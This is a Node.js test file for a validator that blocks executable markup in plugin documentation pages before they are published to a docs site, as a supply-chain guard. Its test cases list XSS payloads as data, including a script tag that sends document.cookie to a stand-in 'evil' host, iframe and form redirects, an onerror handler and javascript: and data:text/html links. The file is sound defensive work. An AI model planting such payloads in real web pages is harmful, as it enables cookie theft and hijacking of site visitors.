// The gate in front of the one place a plugin repository's own bytes are
// written to a file this build publishes.
//
// `scripts/docs/fetch-plugin-docs.mjs` pulls `docs/protocol.md` out of
// every repository carrying the plugin topic and writes it under
// docs/protocols/, where DocFX renders it onto bowire.io. Code scanning
// flagged both writes as "network data written to file", and it was
// right to: DocFX passes raw HTML straight through markdown, so a page's
// bytes reach a visitor's browser on our own origin.
//
// The repositories are the org's own, which makes this a supply-chain
// guard rather than an untrusted-input one — the question is not whether
// a stranger can publish to our docs, but whether ONE compromised plugin
// repository can.

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { rejectPage, MAX_PAGE_BYTES } from '../../../scripts/docs/plugin-docs.mjs';

const page = (body) => `---\ntitle: Example\n---\n\n${body}\n`;

describe('plugin documentation page validation', () => {

    it('accepts a page that is what it claims to be', () => {
        assert.equal(rejectPage(page(
            '# Example protocol\n\n'
            + 'Prose with **emphasis**, a [link](https://bowire.io/docs/), '
            + 'inline `code`, and a fenced block:\n\n'
            + '```bash\nbowire --url example@http://localhost:1234\n```\n'
        )), null);
    });

    it('accepts the inline HTML documentation legitimately uses', () => {
        // Rejecting all HTML would fail pages that are fine. The guard is
        // about markup that EXECUTES, not markup that formats.
        assert.equal(rejectPage(page(
            'A <b>bold</b> word, a <kbd>Ctrl</kbd> key, an <img src="d.png" alt="d">, '
            + 'and a <details><summary>fold</summary>body</details>.'
        )), null);
    });

    it('does not trip over the word javascript in prose', () => {
        // A protocol page may well discuss JavaScript. Only the URL scheme
        // is a problem, and it needs its colon.
        assert.equal(rejectPage(page(
            'The JavaScript SDK wraps this. See the javascript examples below.'
        )), null);
    });

    describe('rejects markup that would execute on bowire.io', () => {
        const cases = [
            ['a script tag', '<script>fetch("//evil/"+document.cookie)</script>', '<script>'],
            ['a spaced script tag', '< script >x</script >', '<script>'],
            ['an uppercase script tag', '<SCRIPT>x</SCRIPT>', '<script>'],
            ['an iframe', '<iframe src="//evil"></iframe>', '<iframe>'],
            ['an object', '<object data="//evil"></object>', '<object>'],
            ['an embed', '<embed src="//evil">', '<embed>'],
            ['a form', '<form action="//evil"><input name=p></form>', '<form>'],
            ['a meta refresh', '<meta http-equiv="refresh" content="0;url=//evil">', '<meta http-equiv>'],
            ['an inline handler', '<img src=x onerror="alert(1)">', 'inline event handler'],
            ['a javascript: link', '[click](javascript:alert(1))', 'javascript: URL'],
            // Deliberately without a script tag in it: the loop returns
            // the FIRST reason, so a body carrying two problems would
            // assert the wrong one.
            ['a data:text/html link', '[click](data:text/html,<h1>evil</h1>)', 'data:text/html'],
        ];
        for (const [name, body, expected] of cases) {
            it(name, () => {
                const reason = rejectPage(page(body));
                assert.notEqual(reason, null, `${name} must not be published`);
                assert.ok(reason.includes(expected),
                    `expected the reason to name ${expected}, got: ${reason}`);
            });
        }
    });

    it('rejects a page with no front matter', () => {
        // The toc generator reads `title` from it; without one the page
        // appears in the navigation as a bare slug, which is
        // indistinguishable from a broken build.
        const reason = rejectPage('# No front matter here');
        assert.ok(reason && reason.includes('front matter'), reason);
    });

    it('refuses to write an unbounded body to disk', () => {
        const reason = rejectPage(page('x'.repeat(MAX_PAGE_BYTES + 1)));
        assert.ok(reason && reason.includes('ceiling'), reason);
    });

    it('measures the ceiling in bytes, not characters', () => {
        // A page just under the limit in characters can be well over it in
        // UTF-8 — which is the number that lands on disk.
        const body = 'ä'.repeat(MAX_PAGE_BYTES - 100);
        const reason = rejectPage(page(body));
        assert.ok(reason && reason.includes('ceiling'), reason);
    });

    it('rejects a body that is not text at all', () => {
        assert.notEqual(rejectPage(null), null);
        assert.notEqual(rejectPage(undefined), null);
        assert.notEqual(rejectPage(Buffer.from('---\na\n---\n')), null);
    });

    it('names the source path it was reading', () => {
        // The message goes into the placeholder page and the build log,
        // where "which file" is the first thing anyone asks.
        const reason = rejectPage(page('<script>x</script>'), 'docs/custom.md');
        assert.ok(reason.startsWith('docs/custom.md'), reason);
    });
});
